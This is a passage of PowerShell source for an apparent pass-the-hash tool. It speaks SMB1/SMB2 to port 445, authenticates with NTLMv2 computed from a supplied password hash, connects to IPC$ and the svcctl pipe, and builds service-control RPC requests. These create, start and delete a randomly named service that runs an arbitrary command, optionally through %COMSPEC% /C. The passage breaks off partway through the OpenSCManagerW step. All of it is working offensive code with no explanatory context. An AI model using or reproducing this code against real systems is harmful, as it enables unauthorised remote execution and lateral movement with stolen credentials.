    $packet_referent_ID = [String](1..2 | ForEach-Object {""{0:X2}"" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID = $packet_referent_ID.Split("" "") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID += 0x00,0x00

    $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ContextHandle"",$packet_context_handle)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceName_MaxCount"",$packet_service_length)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceName_Offset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceName_ActualCount"",$packet_service_length)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceName"",$packet_service)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_DisplayName_ReferentID"",$packet_referent_ID)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_DisplayName_MaxCount"",$packet_service_length)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_DisplayName_Offset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_DisplayName_ActualCount"",$packet_service_length)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_DisplayName"",$packet_service)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_AccessMask"",[Byte[]](0xff,0x01,0x0f,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceType"",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceStartType"",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_ServiceErrorControl"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_BinaryPathName_MaxCount"",$packet_command_length)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_BinaryPathName_Offset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_BinaryPathName_ActualCount"",$packet_command_length)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_BinaryPathName"",$packet_command)
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_NULLPointer"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_TagID"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_NULLPointer2"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_DependSize"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_NULLPointer3"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_NULLPointer4"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMCreateServiceW.Add(""SCMCreateServiceW_PasswordSize"",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SCMCreateServiceW
}

function Get-PacketSCMStartServiceW()
{
    param([Byte[]]$packet_context_handle)

    $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMStartServiceW.Add(""SCMStartServiceW_ContextHandle"",$packet_context_handle)
    $packet_SCMStartServiceW.Add(""SCMStartServiceW_Unknown"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SCMStartServiceW
}

function Get-PacketSCMDeleteServiceW()
{
    param([Byte[]]$packet_context_handle)

    $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMDeleteServiceW.Add(""SCMDeleteServiceW_ContextHandle"",$packet_context_handle)

    return $packet_SCMDeleteServiceW
}

function Get-PacketSCMCloseServiceHandle()
{
    param([Byte[]]$packet_context_handle)

    $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_CloseServiceW.Add(""SCMCloseServiceW_ContextHandle"",$packet_context_handle)

    return $packet_SCM_CloseServiceW
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like ""*:*"")
{
    $hash = $hash.SubString(($hash.IndexOf("":"") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + ""\"" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace ""-00-00"",""""
[Byte[]]$process_ID_bytes = $process_ID.Split(""-"") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
$SMB_client = New-Object System.Net.Sockets.TCPClient
$SMB_client.Client.ReceiveTimeout = 60000

try
{
    $SMB_client.Connect($Target,""445"")
}
catch
{
    Write-Output ""$Target did not respond""
}

if($SMB_client.Connected)
{
    $SMB_client_stream = $SMB_client.GetStream()
    $SMB_client_receive = New-Object System.Byte[] 1024
    $SMB_client_stage = 'NegotiateSMB'

    while($SMB_client_stage -ne 'exit')
    {
        
        switch ($SMB_client_stage)
        {

            'NegotiateSMB'
            {          
                $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                {
                    $SMB_version = 'SMB1'
                    $SMB_client_stage = 'NTLMSSPNegotiate'

                    if([System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f')
                    {
                        Write-Verbose ""SMB signing is enabled""
                        $SMB_signing = $true
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                    }
                    else
                    {
                        $SMB_signing = $false
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x05,0x82,0x08,0xa0
                    }

                }
                else
                {
                    $SMB_client_stage = 'NegotiateSMB2'

                    if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
                    {
                        Write-Verbose ""SMB signing is enabled""
                        $SMB_signing = $true
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                    }
                    else
                    {
                        $SMB_signing = $false
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0
                    }

                }

            }

            'NegotiateSMB2'
            {
                $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                $SMB2_message_ID = 1
                $packet_SMB2_header = Get-PacketSMB2Header 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID  
                $packet_SMB2_data = Get-PacketSMB2NegotiateProtocolRequest
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_client_stage = 'NTLMSSPNegotiate'
            }
                
            'NTLMSSPNegotiate'
            { 
                if($SMB_version -eq 'SMB1')
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes 0x00,0x00

                    if($SMB_signing)
                    {
                        $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                    }

                    $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                    $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                }
                else
                {
                    $SMB2_message_ID += 1
                    $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                    $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                    $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                }

                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_client_stage = 'exit'
            }
            
        }

    }

    $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
    $SMB_NTLMSSP = $SMB_NTLMSSP -replace ""-"",""""
    $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf(""4E544C4D53535000"")
    $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
    $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
    $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
    $SMB_session_ID = $SMB_client_receive[44..51]
    $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
    $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
    $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.Length - 12)..($SMB_target_details.Length - 5)]
    $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join ""-""
    $NTLM_hash_bytes = $NTLM_hash_bytes.Split(""-"") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $auth_hostname = (Get-ChildItem -path env:computername).Value
    $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
    $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
    $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
    $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
    $auth_domain_length = $auth_domain_length[0,1]
    $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
    $auth_domain_length = $auth_domain_length[0,1]
    $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
    $auth_username_length = $auth_username_length[0,1]
    $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
    $auth_hostname_length = $auth_hostname_length[0,1]
    $auth_domain_offset = 0x40,0x00,0x00,0x00
    $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
    $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
    $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
    $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
    $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
    $HMAC_MD5.key = $NTLM_hash_bytes
    $username_and_target = $username.ToUpper()
    $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
    $username_and_target_bytes += $auth_domain_bytes
    $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
    $client_challenge = [String](1..8 | ForEach-Object {""{0:X2}"" -f (Get-Random -Minimum 1 -Maximum 255)})
    $client_challenge_bytes = $client_challenge.Split("" "") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $security_blob_bytes = 0x01,0x01,0x00,0x00,
                            0x00,0x00,0x00,0x00 +
                            $SMB_target_time_bytes +
                            $client_challenge_bytes +
                            0x00,0x00,0x00,0x00 +
                            $SMB_target_details +
                            0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00

    $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
    $HMAC_MD5.key = $NTLMv2_hash
    $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

    if($SMB_signing)
    {
        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
        $session_key = $session_base_key
        $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
        $HMAC_SHA256.key = $session_key
    }

    $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
    $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
    $NTLMv2_response_length = $NTLMv2_response_length[0,1]
    $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

    $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                            0x03,0x00,0x00,0x00,
                            0x18,0x00,
                            0x18,0x00 +
                            $auth_LM_offset +
                            $NTLMv2_response_length +
                            $NTLMv2_response_length +
                            $auth_NTLM_offset +
                            $auth_domain_length +
                            $auth_domain_length +
                            $auth_domain_offset +
                            $auth_username_length +
                            $auth_username_length +
                            $auth_username_offset +
                            $auth_hostname_length +
                            $auth_hostname_length +
                            $auth_hostname_offset +
                            $SMB_session_key_length +
                            $SMB_session_key_length +
                            $SMB_session_key_offset +
                            $SMB_negotiate_flags +
                            $auth_domain_bytes +
                            $auth_username_bytes +
                            $auth_hostname_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            $NTLMv2_response

    if($SMB_version -eq 'SMB1')
    {
        $SMB_user_ID = $SMB_client_receive[32,33]
        $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes $SMB_user_ID

        if($SMB_signing)
        {
            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
        }

        $packet_SMB_header[""SMBHeader_UserID""] = $SMB_user_ID
        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPAuth $NTLMSSP_response
        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
        $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
    }
    else
    {
        $SMB2_message_ID += 1
        $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
        $packet_NTLMSSP_auth = Get-PacketNTLMSSPAuth $NTLMSSP_response
        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
        $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
        $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_auth
        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
    }

    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
    $SMB_client_stream.Flush()
    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

    if($SMB_version -eq 'SMB1')
    {

        if([System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00')
        {
            Write-Verbose ""$output_username successfully authenticated on $Target""
            $login_successful = $true
        }
        else
        {
            Write-Output ""$output_username failed to authenticate on $Target""
            $login_successful = $false
        }

    }
    else
    {
        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')
        {
            Write-Verbose ""$output_username successfully authenticated on $Target""
            $login_successful = $true
        }
        else
        {
            Write-Output ""$output_username failed to authenticate on $Target""
            $login_successful = $false
        }

    }

    if($login_successful)
    {
        $SMB_path = ""\\"" + $Target + ""\IPC$""

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $SMB_named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)
        {
            $SMB_service_random = [String]::Join(""00-"",(1..20 | ForEach-Object{""{0:X2}-"" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace ""-00"",""""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split(""-"") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split(""-"") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
                
            }

        }
        
        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)

        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = ""%COMSPEC% /C `"""" + $Command + ""`""""
        }
        else
        {
            $Command = ""`"""" + $Command + ""`""""
        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += ""{0:X2}-00-"" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
        
        $SMBExec_command_bytes = $SMBExec_command.Split(""-"") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
        $SMB_split_index = 4256
        
        if($SMB_version -eq 'SMB1')
        {
            $SMB_client_stage = 'TreeConnectAndXRequest'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {
            
                switch ($SMB_client_stage)
                {
            
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateAndXRequest'
                    }
                  
                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 
                        $SMB_tree_ID = $SMB_client_receive[28,29]
                        $packet_SMB_header = Get-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'RPCBind'
                    }
                
                    'RPCBind'
                    {
                        $SMB_FID = $SMB_client_receive[42,43]
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
               
                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = Get-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = $SMB_client_stage_next
                    }
                
                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = Get-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
